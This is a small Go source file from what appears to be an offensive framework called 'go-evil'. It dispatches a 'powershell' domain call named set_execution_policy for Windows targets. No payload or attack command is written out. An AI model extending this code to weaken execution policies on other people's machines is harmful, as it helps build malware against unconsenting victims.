package main

import (
	"fmt"

	"github.com/DennisTheodoreNedry/go-evil/domains/powershell/policy"

	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
	notify "github.com/DennisTheodoreNedry/notify_handler"
)

func Parser(function string, value string, data_object *json.Json_t) []string {
	call := []string{}

	if data_object.Target_os != "windows" {
		notify.Error("The target OS must be 'windows' to be able to use the 'powershell' domain!", "powershell.Parser()", 1)
	}

	switch function {
	case "set_execution_policy":
		call = policy.Set_execution(value, data_object)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "powershell.Parser()", 1)

	}

	return call
}
